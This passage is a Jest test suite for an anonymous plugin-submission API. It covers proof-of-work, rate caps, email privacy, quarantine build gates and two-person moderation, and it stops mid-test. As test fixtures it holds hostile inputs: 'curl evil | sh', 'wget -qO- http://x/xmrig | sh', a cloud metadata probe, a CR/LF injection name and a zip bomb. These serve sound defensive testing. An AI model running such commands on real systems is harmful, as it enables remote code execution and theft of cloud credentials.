// Copyright 2026 Pipeline Builder Contributors
// SPDX-License-Identifier: Apache-2.0

/**
 * Anonymous public submissions end to end against the
 * in-memory database and the REAL submission router: the availability gate
 * (flag, secrets, outbound email), proof-of-work (missing / wrong / replayed),
 * the daily caps, the email handling (never stored or returned in clear), the
 * single-use expiring magic link, the status token, the name gate, the
 * quarantine gate pipeline, moderation — which can't be bypassed: only
 * the two-person `submission` request publishes, and only from quarantine —
 * rejection, claims and the maintenance job.
 */

import { mkdtempSync, realpathSync } from 'node:fs';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, it, expect, beforeAll, afterAll, beforeEach, jest } from '@jest/globals';
import AdmZip from 'adm-zip';
import { PgDialect } from 'drizzle-orm/pg-core';

process.env.PLUGIN_UPLOAD_DIR = mkdtempSync(join(tmpdir(), 'plugin-submissions-upload-'));
// realpath: the Dockerfile containment check compares resolved paths (macOS /var → /private/var).
process.env.DOCKER_BUILD_TEMP_ROOT = realpathSync(mkdtempSync(join(tmpdir(), 'plugin-submissions-build-')));

import { DIGEST_A, moderator, seedPublishers, setupEcosystemHarness, tenant, wireEcosystemHarness } from './helpers/ecosystem-harness.js';

const h = setupEcosystemHarness();

const artifacts = { put: jest.fn(async (..._a: unknown[]) => undefined), del: jest.fn(async (..._a: unknown[]) => undefined) };
jest.unstable_mockModule('../src/services/plugin-artifact-storage.js', () => ({
  PLUGIN_ARTIFACT_BUCKET: 'plugins',
  pluginQuarantineBucket: () => 'plugin-quarantine',
  submissionArtifactKey: (id: string) => `submissions/${id}.zip`,
  putPluginArtifact: artifacts.put,
  deletePluginArtifact: artifacts.del,
  getPluginArtifactToFile: jest.fn(async () => undefined),
}));

const { solveProofOfWork, SYSTEM_ORG_ID } = await import('@pipeline-builder/api-core');
const { createPublicSubmissionRoutes } = await import('../src/routes/public-submissions.js');
const submissionsSvc = await import('../src/services/ecosystem/submissions.js');
const submissionConfig = await import('../src/services/ecosystem/submission-config.js');
const submissionGuards = await import('../src/services/ecosystem/submission-guards.js');
const pipeline = await import('../src/services/ecosystem/submission-pipeline.js');
const decisions = await import('../src/services/ecosystem/decisions.js');
const requestsSvc = await import('../src/services/ecosystem/requests.js');
const consoleSvc = await import('../src/services/ecosystem/console.js');
const { setEmailStatusProbeForTests } = await import('../src/services/ecosystem/email-status.js');
await wireEcosystemHarness(h);

const { db } = h;

const ENV = {
  ANONYMOUS_SUBMISSIONS_ENABLED: 'true',
  SUBMISSION_POW_SECRET: 'pow-secret-for-tests',
  SUBMISSION_POW_DIFFICULTY: '4',
  SUBMISSION_EMAIL_HASH_SECRET: 'email-hash-secret-for-tests',
  PLUGIN_QUARANTINE_BUILDKIT_ADDR: 'tcp://buildkitd-quarantine:1234',
  SECRET_ENCRYPTION_KEY: 'a'.repeat(64),
  PLATFORM_FRONTEND_URL: 'https://pb.example',
};

// -----------------------------------------------------------------------------
// Fixtures
// -----------------------------------------------------------------------------

const SPEC = (name = 'my-linter', version = '1.0.0', extra = '') => [
  `name: ${name}`,
  `version: ${version}`,
  'description: Lints things.',
  'keywords: [lint]',
  'category: quality',
  'pluginType: CodeBuildStep',
  'computeType: SMALL',
  'timeout: 30',
  'failureBehavior: fail',
  'secrets: []',
  'primaryOutputDirectory: out',
  'dockerfile: Dockerfile',
  'installCommands: []',
  'commands:',
  '  - lint .',
  'license: MIT',
  'smokeTest: lint --version',
  extra,
].filter(Boolean).join('\n');

const DOCKERFILE = 'FROM alpine:3.20\nWORKDIR /work\nUSER 1000:1000\n';

function zipOf(files: Record<string, string>): Buffer {
  const zip = new AdmZip();
  for (const [name, content] of Object.entries(files)) zip.addFile(name, Buffer.from(content, 'utf-8'));
  return zip.toBuffer();
}

const goodZip = (name?: string, version?: string, extra?: Record<string, string>) =>
  zipOf({ 'plugin-spec.yaml': SPEC(name, version), 'Dockerfile': DOCKERFILE, 'README.md': '# My linter\n\nLints.\n', ...(extra ?? {}) });

// -----------------------------------------------------------------------------
// HTTP harness
// -----------------------------------------------------------------------------

let base = '';
let server: import('node:http').Server;
const replay = new Set<string>();
/** The in-memory daily-cap counters (key → count + window end). */
const caps = new Map<string, { n: number; until: number }>();
let capsDown = false;
const dialect = new PgDialect();

/** The email purge's SQL (`submissions.purgeEmails`), run against the in-memory table. */
function purgeHandler(q: unknown): unknown {
  const { sql: text, params } = dialect.sqlToQuery(q as never);
  if (!/UPDATE plugin_submissions\s+SET email_hash = NULL, email_enc = NULL/.test(text)) return { rows: [] };
  expect(text).toMatch(/email_purge_after <= \$1/);
  expect(text).toMatch(/email_hash IS NOT NULL OR email_enc IS NOT NULL/);
  const [nowIso, limit] = params as [string | Date, number];
  const now = new Date(nowIso).getTime();
  const due = (db.tables.plugin_submissions ?? [])
    .filter((r) => r.emailPurgeAfter && new Date(r.emailPurgeAfter).getTime() <= now && (r.emailHash !== null || r.emailEnc !== null))
    .slice(0, Number(limit));
  for (const r of due) Object.assign(r, { emailHash: null, emailEnc: null });
  return { rows: due.map((r) => ({ id: r.id })) };
}
let emailEnabled = true;
const enqueued: string[] = [];

beforeAll(async () => {
  const { createApp, attachRequestContext } = await import('@pipeline-builder/api-server');
  const { app, sseManager } = createApp({ enableOpenApi: false, enableRateLimit: false });
  app.use(attachRequestContext(sseManager));
  // The per-IP route limits would throttle a suite that submits from one address.
  app.use('/public/plugin-submissions', createPublicSubmissionRoutes({ readsPerMinute: 100_000, writesPerMinute: 100_000 }));
  server = app.listen(0);
  await new Promise((r) => server.once('listening', r));
  base = `http://127.0.0.1:${(server.address() as AddressInfo).port}/public/plugin-submissions`;
});
afterAll(() => { server.close(); });

beforeEach(() => {
  db.reset();
  jest.clearAllMocks();
  Object.assign(process.env, ENV);
  replay.clear();
  enqueued.length = 0;
  emailEnabled = true;
  setEmailStatusProbeForTests(async () => emailEnabled);
  submissionGuards.setPowReplayStoreForTests({ claim: async (key) => (replay.has(key) ? false : (replay.add(key), true)) });
  caps.clear();
  capsDown = false;
  submissionGuards.setDailyCapStoreForTests({
    incr: async (key, ttlMs) => {
      if (capsDown) throw new Error('redis down');
      const now = Date.now();
      const cur = caps.get(key);
      const next = cur && cur.until > now ? { n: cur.n + 1, until: cur.until } : { n: 1, until: now + ttlMs };
      caps.set(key, next);
      return next.n;
    },
  });
  db.execute.handler = purgeHandler;
  submissionsSvc.setSubmissionEnqueueForTests(async (id) => { enqueued.push(id); });
  seedPublishers(db);
  db.seed('publishers', { handle: 'community', ownerOrgId: null, displayName: 'Community', tier: 'unverified' });
});

async function pow(): Promise<string> {
  const c = (await (await fetch(`${base}/challenge`)).json()) as { data: { challenge: string; difficulty: number } };
  return JSON.stringify({ challenge: c.data.challenge, nonce: solveProofOfWork(c.data.challenge, c.data.difficulty) });
}

async function submit(fields: { zip?: Buffer; email?: string; pow?: string | null; acceptTerms?: string | null; metadata?: string }) {
  const form = new FormData();
  form.append('plugin', new Blob([new Uint8Array(fields.zip ?? goodZip())]), 'plugin.zip');
  form.append('email', fields.email ?? 'Dev@Example.com');
  if (fields.pow !== null) form.append('pow', fields.pow ?? await pow());
  if (fields.acceptTerms !== null) form.append('acceptTerms', fields.acceptTerms ?? 'true');
  if (fields.metadata) form.append('metadata', fields.metadata);
  const res = await fetch(base, { method: 'POST', body: form });
  return { status: res.status, body: (await res.json()) as any };
}

/** The magic-link token from the N1 email. */
function magicToken(): string {
  const call = h.notify.mock.calls.filter((c: any[]) => c[0] === 'N1').at(-1) as any[];
  return /token=([^\s&]+)/.exec(call[2].text)![1]!;
}

async function verify(token: string) {
  const res = await fetch(`${base}/verify`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ token: decodeURIComponent(token) }) });
  return { status: res.status, body: (await res.json()) as any };
}

/** Submit + verify → a pending_review submission (the gates enqueued). */
async function submitted(zip?: Buffer, email?: string): Promise<{ id: string; statusToken: string }> {
  const created = await submit({ zip, email });
  expect(created.status).toBe(202);
  const v = await verify(magicToken());
  expect(v.status).toBe(200);
  h.notify.mockClear();
  return { id: created.body.data.id, statusToken: v.body.data.statusToken };
}

/** Pipeline I/O that "builds" successfully. */
function greenBuild(over: Partial<{ runAsRoot: boolean | null; critical: number; fixable: number; smoke: 'pass' | 'fail'; build: 'ok' | 'fail' }> = {}) {
  const build = jest.fn(async (s: any) => {
    if (over.build === 'fail') throw new Error('RUN step failed: exit 2');
    const fixable = over.fixable ?? over.critical ?? 0;
    return {
      imageRepository: `quarantine/${s.id}`,
      digest: DIGEST_A,
      scan: { vulnCritical: over.critical ?? 0, vulnHigh: 0, vulnMedium: 1, vulnLow: 2, vulnCriticalFixable: fixable, vulnHighFixable: 0, scannedAt: new Date() },
      findings: Array.from({ length: fixable }, (_, i) => ({ id: `CVE-2026-${i + 1}`, severity: 'critical' as const, packageName: 'openssl', packageVersion: '3.0.1', fixedIn: ['3.0.2'] })),
      runAsRoot: over.runAsRoot === undefined ? false : over.runAsRoot,
    };
  });
  const smokeTest = jest.fn(async (..._a: unknown[]) => { if (over.smoke === 'fail') throw new Error('exit 127'); });
  let zip: Buffer = goodZip();
  const deps = {
    fetchPackage: jest.fn(async () => {
      const dir = mkdtempSync(join(tmpdir(), 'pb-sub-test-'));
      const file = join(dir, 'package.zip');
      (await import('node:fs')).writeFileSync(file, zip);
      return file;
    }),
    build,
    smokeTest,
  };
  pipeline.setSubmissionPipelineDepsForTests(deps);
  return { deps, useZip: (z: Buffer) => { zip = z; } };
}

const row = (id: string) => db.tables.plugin_submissions!.find((r) => r.id === id)!;

// -----------------------------------------------------------------------------
// Availability
// -----------------------------------------------------------------------------

describe('availability (fail closed)', () => {
  it.each([
    ['the flag is off', () => { process.env.ANONYMOUS_SUBMISSIONS_ENABLED = 'false'; }],
    ['outbound email is not configured', () => { emailEnabled = false; }],
    ['the PoW secret is missing', () => { delete process.env.SUBMISSION_POW_SECRET; }],
    ['the email hash secret is missing', () => { delete process.env.SUBMISSION_EMAIL_HASH_SECRET; }],
    ['the quarantine buildkitd is not configured', () => { delete process.env.PLUGIN_QUARANTINE_BUILDKIT_ADDR; }],
  ])('answers 404 SUBMISSIONS_DISABLED on every route when %s', async (_why, setup) => {
    setup();
    setEmailStatusProbeForTests(async () => emailEnabled);
    for (const [method, path] of [['GET', '/challenge'], ['GET', '/status?token=x'], ['POST', '/verify'], ['POST', ''], ['POST', '/inspect']]) {
      const res = await fetch(`${base}${path}`, { method });
      expect(res.status).toBe(404);
      expect(((await res.json()) as any).code).toBe('SUBMISSIONS_DISABLED');
      expect(res.headers.get('cache-control')).toBe('no-store');
    }
  });

  it('treats an unreachable email-status probe as email off', async () => {
    setEmailStatusProbeForTests(async () => { throw new Error('platform down'); });
    expect((await fetch(`${base}/challenge`)).status).toBe(404);
  });

  it('serves a signed challenge at the configured difficulty', async () => {
    const res = await fetch(`${base}/challenge`);
    expect(res.status).toBe(200);
    const body = (await res.json()) as any;
    expect(body.data).toMatchObject({ difficulty: 4 });
    expect(typeof body.data.challenge).toBe('string');
  });
});

// -----------------------------------------------------------------------------
// Submitting
// -----------------------------------------------------------------------------

describe('POST / (submit into quarantine)', () => {
  it('accepts a submission: 202, pending_verification, zip staged in the quarantine bucket, N1 magic link, anonymous audit', async () => {
    const res = await submit({});
    expect(res.status).toBe(202);
    expect(res.body.data).toEqual({ id: expect.any(String), status: 'pending_verification' });
    const s = row(res.body.data.id);
    expect(s.status).toBe('pending_verification');
    // Never stored in clear: an HMAC and a ciphertext.
    expect(s.emailHash).toMatch(/^[0-9a-f]{64}$/);
    expect(JSON.stringify(s)).not.toContain('dev@example.com');
    expect(JSON.parse(s.emailEnc).alg).toBe('aes-256-gcm-v1');
    expect(s.clientIpHash).toMatch(/^[0-9a-f]{64}$/);
    expect(artifacts.put).toHaveBeenCalledWith(`submissions/${s.id}.zip`, expect.any(Buffer), 'plugin-quarantine');
    const n1 = h.notify.mock.calls.find((c: any[]) => c[0] === 'N1') as any[];
    expect(n1[1]).toEqual([{ kind: 'address', email: 'dev@example.com' }]);
    expect(n1[2].text).toContain('https://pb.example/plugins/submit/verify?token=');
    expect(n1[2].text).toContain('https://pb.example/plugins/submit/status?token=');
    expect(h.audit).toHaveBeenCalledWith(expect.objectContaining({
      action: 'plugin.submission.create', actorId: 'anonymous', orgId: SYSTEM_ORG_ID, details: expect.objectContaining({ submissionId: s.id }),
    }));
    expect(JSON.stringify(h.audit.mock.calls)).not.toContain('example.com');
    // Nothing reached the tenant catalog.
    expect(db.tables.plugins ?? []).toEqual([]);
    expect(db.tables.plugin_publish_requests ?? []).toEqual([]);
  });

  it('refuses a missing, malformed, wrong or replayed proof-of-work', async () => {
    expect((await submit({ pow: null })).body.code).toBe('PROOF_OF_WORK_INVALID');
    expect((await submit({ pow: 'not json' })).body.code).toBe('PROOF_OF_WORK_INVALID');
    const c = (await (await fetch(`${base}/challenge`)).json() as any).data;
    let bad = 0;
    const { leadingZeroBits, proofOfWorkHash } = await import('@pipeline-builder/api-core');
    while (leadingZeroBits(proofOfWorkHash(c.challenge, String(bad))) >= c.difficulty) bad++;
    const wrong = await submit({ pow: JSON.stringify({ challenge: c.challenge, nonce: String(bad) }) });
    expect(wrong.status).toBe(400);
    expect(wrong.body).toMatchObject({ code: 'PROOF_OF_WORK_INVALID', details: { reason: 'insufficient_work' } });
    const once = await pow();
    expect((await submit({ pow: once })).status).toBe(202);
    const replayed = await submit({ pow: once });
    expect(replayed.status).toBe(400);
    expect(replayed.body.details.reason).toBe('replayed');
  });

  it('fails closed when the single-use store is down', async () => {
    submissionGuards.setPowReplayStoreForTests({ claim: async () => { throw new Error('redis down'); } });
    expect((await submit({})).status).toBe(503);
  });

  it('refuses without the terms or a valid email, naming the field', async () => {
    const terms = await submit({ acceptTerms: null });
    expect(terms.status).toBe(400);
    expect(terms.body.details.field).toBe('acceptTerms');
    const email = await submit({ email: 'not-an-email' });
    expect(email.status).toBe(400);
    expect(email.body.details.field).toBe('email');
  });

  it('refuses execution-contract keys in the metadata edits', async () => {
    const res = await submit({ metadata: JSON.stringify({ commands: ['curl evil | sh'] }) });
    expect(res.status).toBe(400);
    expect(res.body.details).toMatchObject({ field: 'commands', contractKeys: ['commands'] });
  });

  it('caps each email and each client IP at 3 per rolling 24 h', async () => {
    for (let i = 0; i < 3; i++) expect((await submit({ zip: goodZip(`p${i}`) })).status).toBe(202);
    const fourth = await submit({ zip: goodZip('p9') });
    expect(fourth.status).toBe(429);
    expect(fourth.body.code).toBe('SUBMISSION_LIMIT');
    // Same IP, another email: the IP cap still binds.
    expect((await submit({ zip: goodZip('p10'), email: 'other@example.com' })).body.code).toBe('SUBMISSION_LIMIT');
    // A day later the window has rolled.
    for (const c of caps.values()) c.until = Date.now() - 1;
    expect((await submit({ zip: goodZip('p11') })).status).toBe(202);
  });

  it('counts the attempt BEFORE opening the package, so a refused zip still spends the slot', async () => {
    for (let i = 0; i < 3; i++) expect((await submit({ zip: zipOf({ Dockerfile: DOCKERFILE }) })).status).toBe(400);
    expect((await submit({ zip: goodZip('p1') })).body.code).toBe('SUBMISSION_LIMIT');
  });

  it('fails closed (503) when the cap counters are unavailable', async () => {
    capsDown = true;
    const res = await submit({ zip: goodZip() });
    expect(res.status).toBe(503);
    expect(db.tables.plugin_submissions ?? []).toHaveLength(0);
  });

  it('refuses a name or version that is not the plugin-spec shape (CR/LF, uppercase) —', async () => {
    const res = await submit({ zip: zipOf({ 'plugin-spec.yaml': SPEC('"Evil\\r\\nBcc"'), 'Dockerfile': DOCKERFILE }) });
    expect(res.status).toBe(400);
    expect(res.body.message).toMatch(/name must match/);
    const badVersion = await submit({ zip: zipOf({ 'plugin-spec.yaml': SPEC('ok-name', '"1.0.0\\nx"'), 'Dockerfile': DOCKERFILE }) });
    expect(badVersion.status).toBe(400);
    expect(badVersion.body.message).toMatch(/version must be semver/);
  });

  it('extracts an anonymous package under tight caps — a small zip bomb is refused', async () => {
    process.env.SUBMISSION_MAX_ZIP_BYTES = '2048';
    try {
      // 64 KiB of zeros compresses to a few hundred bytes: under the zip cap, over 10 × it once expanded.
      const bomb = zipOf({ 'plugin-spec.yaml': SPEC(), 'Dockerfile': DOCKERFILE, 'pad.bin': '0'.repeat(64 * 1024) });
      expect(bomb.length).toBeLessThan(2048);
      const res = await submit({ zip: bomb });
      expect(res.status).toBe(400);
      expect(res.body.message).toMatch(/maximum extracted size \(20480 bytes\)/);
    } finally {
      delete process.env.SUBMISSION_MAX_ZIP_BYTES;
    }
  });

  it('caps the entry count of an anonymous package at 2000', async () => {
    const files: Record<string, string> = { 'plugin-spec.yaml': SPEC(), 'Dockerfile': DOCKERFILE };
    for (let i = 0; i < 2001; i++) files[`f/${i}.txt`] = 'x';
    const res = await submit({ zip: zipOf(files) });
    expect(res.status).toBe(400);
    expect(res.body.message).toMatch(/maximum entry count \(2000\)/);
  }, 30_000);

  it('refuses packages the platform cannot build from source', async () => {
    const prebuilt = await submit({ zip: zipOf({ 'plugin-spec.yaml': SPEC(), 'config.yaml': 'buildType: prebuilt\n', 'image.tar': 'x' }) });
    expect(prebuilt.status).toBe(400);
    const noSpec = await submit({ zip: zipOf({ Dockerfile: DOCKERFILE }) });
    expect(noSpec.status).toBe(400);
  });
});

// -----------------------------------------------------------------------------
// Names
// -----------------------------------------------------------------------------

describe('the name gate', () => {
  it('refuses reserved names, Official/Verified names and names confusable with a top listing (409 NAME_TAKEN)', async () => {
    expect((await submit({ zip: goodZip('registry') })).body).toMatchObject({ code: 'NAME_TAKEN', details: { reason: 'reserved' } });
    const official = db.tables.publishers!.find((p) => p.handle === 'pipeline-builder')!;
    const tf = db.seed('plugin_listings', { publisherId: official.id, name: 'terraform' });
    expect((await submit({ zip: goodZip('terraform') })).body.details.reason).toBe('trusted_listing');
    db.seed('plugin_stats', { listingId: tf.id, installCount: 40 });
    expect((await submit({ zip: goodZip('terraf0rm') })).body.details.reason).toBe('confusable');
    // Refused attempts spend the daily cap too (counted before the package is opened).
    caps.clear();
    expect((await submit({ zip: goodZip('terraform-docs') })).status).toBe(202);
  });

  it('lets only the original submitter update a community listing', async () => {
    const community = db.tables.publishers!.find((p) => p.handle === 'community')!;
    const listing = db.seed('plugin_listings', { publisherId: community.id, name: 'my-linter' });
    db.seed('plugin_submissions', {
      status: 'approved',
      name: 'my-linter',
      version: '0.9.0',
      listingId: listing.id,
      emailHash: submissionGuards.hashEmail('owner@example.com'),
      expiresAt: new Date(),
    });
    const intruder = await submit({ zip: goodZip('my-linter', '1.0.0'), email: 'intruder@example.com' });
    expect(intruder.status).toBe(409);
    expect(intruder.body.details.reason).toBe('taken');
    expect((await submit({ zip: goodZip('my-linter', '1.0.0'), email: 'Owner@example.com' })).status).toBe(202);
  });
});

// -----------------------------------------------------------------------------
// Verify + status
// -----------------------------------------------------------------------------

describe('POST /verify and GET /status', () => {
  it('verifies once (single use), enqueues the gates, returns the status token; the link is then dead', async () => {
    const created = await submit({});
    const token = magicToken();
    const v = await verify(token);
    expect(v.status).toBe(200);
    expect(v.body.data).toEqual({ id: created.body.data.id, status: 'pending_review', statusToken: expect.any(String) });
    expect(enqueued).toEqual([created.body.data.id]);
    expect(row(created.body.data.id).verifyTokenHash).toBeNull();
    expect(h.audit).toHaveBeenCalledWith(expect.objectContaining({ action: 'plugin.submission.verify', actorId: 'anonymous' }));
    const again = await verify(token);
    expect(again.status).toBe(404);
    expect(enqueued).toHaveLength(1);
  });

  it('refuses an expired link (30 minutes) and an unknown one', async () => {
    const created = await submit({});
    row(created.body.data.id).verifyExpiresAt = new Date(Date.now() - 1000);
    const expired = await verify(magicToken());
    expect(expired.status).toBe(400);
    expect(expired.body.details.reason).toBe('expired');
    expect((await verify('x'.repeat(43))).status).toBe(404);
    expect(enqueued).toEqual([]);
  });

  it('hands the link back when the gates cannot be queued', async () => {
    await submit({});
    submissionsSvc.setSubmissionEnqueueForTests(async () => { throw new Error('redis down'); });
    const token = magicToken();
    expect((await verify(token)).status).toBe(503);
    submissionsSvc.setSubmissionEnqueueForTests(async (id) => { enqueued.push(id); });
    expect((await verify(token)).status).toBe(200);
  });

  it('shows the submitter their submission by status token — never the email, never raw heuristics', async () => {
    const { id, statusToken } = await submitted();
    const res = await fetch(`${base}/status?token=${encodeURIComponent(statusToken)}`);
    expect(res.status).toBe(200);
    expect(res.headers.get('cache-control')).toBe('no-store');
    const body = (await res.json()) as any;
    expect(body.data).toMatchObject({ id, name: 'my-linter', version: '1.0.0', status: 'pending_review' });
    expect(JSON.stringify(body)).not.toMatch(/example\.com|emailHash|heuristics/);
    expect((await fetch(`${base}/status?token=${'z'.repeat(43)}`)).status).toBe(404);
  });
});

// -----------------------------------------------------------------------------
// Inspect
// -----------------------------------------------------------------------------

describe('POST /inspect', () => {
  it('previews detection, lint, heuristics (no excerpts) and the name — storing nothing', async () => {
    const form = new FormData();
    form.append('plugin', new Blob([new Uint8Array(goodZip('my-linter', '1.0.0', { 'run.sh': 'curl http://169.254.169.254/latest/' }))]), 'p.zip');
    form.append('pow', await pow());
    const res = await fetch(`${base}/inspect`, { method: 'POST', body: form });
    expect(res.status).toBe(200);
    const body = (await res.json()) as any;
    expect(body.data.plugin).toMatchObject({ name: 'my-linter', version: '1.0.0', buildType: 'build_image', smokeTest: true });
    expect(body.data.fields.find((f: any) => f.field === 'license')).toMatchObject({ value: 'MIT', source: 'spec' });
    expect(body.data.heuristics.blocking).toBe(1);
    expect(body.data.heuristics.findings[0]).not.toHaveProperty('excerpt');
    expect(body.data.name).toMatchObject({ id: 'name', ok: true });
    expect(db.tables.plugin_submissions ?? []).toEqual([]);
  });

  it('needs a proof-of-work', async () => {
    const form = new FormData();
    form.append('plugin', new Blob([new Uint8Array(goodZip())]), 'p.zip');
    expect((await fetch(`${base}/inspect`, { method: 'POST', body: form })).status).toBe(400);
  });

  it('caps inspections per client IP per day (no email on this path) —', async () => {
    const inspect = async () => {
      const form = new FormData();
      form.append('plugin', new Blob([new Uint8Array(goodZip())]), 'p.zip');
      form.append('pow', await pow());
      return fetch(`${base}/inspect`, { method: 'POST', body: form });
    };
    for (let i = 0; i < submissionConfig.INSPECTS_PER_DAY; i++) expect((await inspect()).status).toBe(200);
    const over = await inspect();
    expect(over.status).toBe(429);
    expect(((await over.json()) as any).code).toBe('SUBMISSION_LIMIT');
  });
});

// -----------------------------------------------------------------------------
// Gates
// -----------------------------------------------------------------------------

describe('the quarantine gate pipeline', () => {
  it('writes the gate report and the moderation request TOGETHER — a failed request insert records no report', async () => {
    greenBuild();
    const { id } = await submitted();
    db.failNextInsert('plugin_publish_requests', new Error('connection reset'));
    await expect(pipeline.runSubmissionGates(id)).rejects.toThrow('connection reset');
    expect(row(id)).toMatchObject({ status: 'pending_review', gateReport: null });
    // The queue's retry runs the gates again and queues it.
    expect(await pipeline.runSubmissionGates(id)).toBe('queued');
    expect(await pipeline.runSubmissionGates(id)).toBe('skipped');
  });

  it('a submission write inside a failing `atomically` block rolls back with it', async () => {
    const { id } = await submitted();
    const { atomically } = await import('../src/services/ecosystem/store.js');
    const { submissions } = await import('../src/services/ecosystem/submissions-store.js');
    const before = row(id).status;
    await expect(atomically(async () => {
      await submissions.update(id, { status: 'approved' });
      throw new Error('later write failed');
    })).rejects.toThrow('later write failed');
    expect(row(id).status).toBe(before);
  });

  it('a submission with a report but NO open request is not stranded: the gates run again', async () => {
    greenBuild();
    const { id } = await submitted();
    row(id).gateReport = { gates: [], completedAt: new Date().toISOString() };
    expect(await pipeline.runSubmissionGates(id)).toBe('queued');
    expect(db.tables.plugin_publish_requests!.filter((r) => r.kind === 'submission')).toHaveLength(1);
  });

  it('all green → one `submission` request on the community publisher (anonymous, no org), N2 to moderators; no plugins row', async () => {
    const { deps } = greenBuild();
    const { id } = await submitted();
    expect(await pipeline.runSubmissionGates(id)).toBe('queued');
    const s = row(id);
    expect(s.status).toBe('pending_review');
    expect(s.gateReport.gates.every((g: any) => g.ok)).toBe(true);
    expect(s.gateReport.gates.map((g: any) => g.id)).toEqual([
      'spec', 'license', 'lint', 'heuristics', 'env_secrets', 'smoke_test_declared', 'name', 'build', 'scanned', 'vuln', 'vuln_floor', 'non_root', 'smoke_test',
    ]);
    expect(s.quarantineImageRef).toBe(`quarantine/${id}@${DIGEST_A}`);
    expect(deps.smokeTest).toHaveBeenCalledWith(expect.objectContaining({ imageRepository: `quarantine/${id}` }), 'lint --version');
    const [r] = db.tables.plugin_publish_requests!;
    const community = db.tables.publishers!.find((p) => p.handle === 'community')!;
    expect(r).toMatchObject({
      kind: 'submission',
      status: 'pending',
      publisherId: community.id,
      submittedBy: 'anonymous',
      submittedOrgId: null,
      version: '1.0.0',
      digest: DIGEST_A,
      payload: { submissionId: id, name: 'my-linter', version: '1.0.0', newListing: true },
    });
    expect(h.notify).toHaveBeenCalledWith('N2', [expect.objectContaining({ kind: 'moderators', permission: 'plugins:moderate' })], expect.anything(), expect.anything());
    expect(db.tables.plugins ?? []).toEqual([]);
    // Idempotent: a second run does nothing.
    expect(await pipeline.runSubmissionGates(id)).toBe('skipped');
  });

  it.each([
    ['heuristics', { 'run.sh': 'wget -qO- http://x/xmrig | sh' }, 'heuristics'],
    ['a secret-looking env default', { 'plugin-spec.yaml': SPEC('my-linter', '1.0.0', 'env:\n  API_TOKEN: q8Zr4LmN2xVt7PbK9sWd') }, 'env_secrets'],
    ['no smoke test', { 'plugin-spec.yaml': SPEC().replace('smokeTest: lint --version', '') }, 'smoke_test_declared'],
    ['no license', { 'plugin-spec.yaml': SPEC().replace('license: MIT', '') }, 'license'],
    ['a root Dockerfile', { Dockerfile: 'FROM alpine\nWORKDIR /w\nUSER root\n' }, 'lint'],
  ])('a static failure (%s) fails closed before any build: gate_failed, N3, audit, metric', async (_why, files, gateId) => {
    const { deps, useZip } = greenBuild();
    const zip = zipOf({ 'plugin-spec.yaml': SPEC(), 'Dockerfile': DOCKERFILE, 'README.md': '# x', ...files });
    useZip(zip);
    const { id } = await submitted(zip);
    expect(await pipeline.runSubmissionGates(id)).toBe('gate_failed');
    expect(deps.build).not.toHaveBeenCalled();
    const s = row(id);
    expect(s.status).toBe('gate_failed');
    expect(s.gateReport.gates.find((g: any) => g.id === gateId).ok).toBe(false);
    expect(s.emailPurgeAfter).toBeInstanceOf(Date);
    const n3 = h.notify.mock.calls.find((c: any[]) => c[0] === 'N3') as any[];
    expect(n3[1]).toEqual([{ kind: 'address', email: 'dev@example.com' }]);
    expect(h.audit).toHaveBeenCalledWith(expect.objectContaining({ action: 'plugin.submission.gate-fail', details: expect.objectContaining({ gates: expect.arrayContaining([gateId]) }) }));
    expect(db.tables.plugin_publish_requests ?? []).toEqual([]);
  });

  it.each([
    ['the build fails', { build: 'fail' as const }, 'build'],
    ['the image runs as root', { runAsRoot: true }, 'non_root'],
    ['root-ness is unknown', { runAsRoot: null }, 'non_root'],
    ['a fixable critical vulnerability', { critical: 1 }, 'vuln'],
    ['a fixable critical over the platform floor', { critical: 1 }, 'vuln_floor'],
    ['the smoke test fails', { smoke: 'fail' as const }, 'smoke_test'],
  ])('an image failure (%s) → gate_failed, no request', async (_why, over, gateId) => {
    greenBuild(over);
    const { id } = await submitted();
    artifacts.del.mockClear();
    h.registryDelete.mockClear();
    expect(await pipeline.runSubmissionGates(id)).toBe('gate_failed');
    expect(row(id).gateReport.gates.find((g: any) => g.id === gateId).ok).toBe(false);
    expect(db.tables.plugin_publish_requests ?? []).toEqual([]);
    // A failed submission's quarantined package and build are dropped at once.
    expect(artifacts.del).toHaveBeenCalledWith(`submissions/${id}.zip`, 'plugin-quarantine');
    expect(h.registryDelete).toHaveBeenCalledWith(`/internal/quarantine/${id}`, expect.anything());
  });

  it('counts only FIXABLE criticals: an unfixable one passes both vuln gates', async () => {
    greenBuild({ critical: 2, fixable: 0 });
    const { id } = await submitted();
    expect(await pipeline.runSubmissionGates(id)).toBe('queued');
    const gates = row(id).gateReport.gates;
    expect(gates.find((g: any) => g.id === 'vuln')).toMatchObject({ ok: true, message: expect.stringMatching(/2 critical \(0 fixable\)/) });
    expect(gates.find((g: any) => g.id === 'vuln_floor').ok).toBe(true);
    expect(row(id).gateReport.facts).toMatchObject({ vulnCritical: 2, vulnCriticalFixable: 0 });
  });

  it('the platform floor message names the CVE and its fixed version', async () => {
    greenBuild({ critical: 1 });
    const { id } = await submitted();
    await pipeline.runSubmissionGates(id);
    expect(row(id).gateReport.gates.find((g: any) => g.id === 'vuln_floor').message).toMatch(/CVE-2026-1 \(openssl@3\.0\.1 → 3\.0\.2\)/);
  });

  it('fails a submission closed when the queue gives up on it', async () => {
    const { id } = await submitted();
    await pipeline.failSubmissionPipeline(id, 'buildkitd unreachable');
    expect(row(id)).toMatchObject({ status: 'gate_failed' });
    expect(row(id).gateReport.gates).toEqual([expect.objectContaining({ id: 'pipeline', ok: false })]);
  });
});

// -----------------------------------------------------------------------------
// Moderation (two-person, cannot be bypassed)
// -----------------------------------------------------------------------------

async function queued(): Promise<{ id: string; requestId: string }> {
  greenBuild();
  const { id } = await submitted();
  await pipeline.runSubmissionGates(id);
  h.notify.mockClear();
  return { id, requestId: db.tables.plugin_publish_requests!.find((r) => r.kind === 'submission')!.id };
}

describe('moderating a submission', () => {
  it('needs TWO managers; the second approval publishes quarantine/<id> → public/community/<name> (unverified) and tells the submitter (N4)', async () => {
    const { id, requestId } = await queued();
    const first = await decisions.approve(moderator('mod-1') as any, requestId, null);
    expect(first.executed).toBe(false);
    expect(first.request.status).toBe('pending_second_approval');
    expect(h.registryPost).not.toHaveBeenCalled();
    await expect(decisions.secondApprove(moderator('mod-1') as any, requestId, null)).rejects.toMatchObject({ code: 'SEPARATION_OF_DUTIES' });

    const second = await decisions.secondApprove(moderator('mod-2') as any, requestId, null);
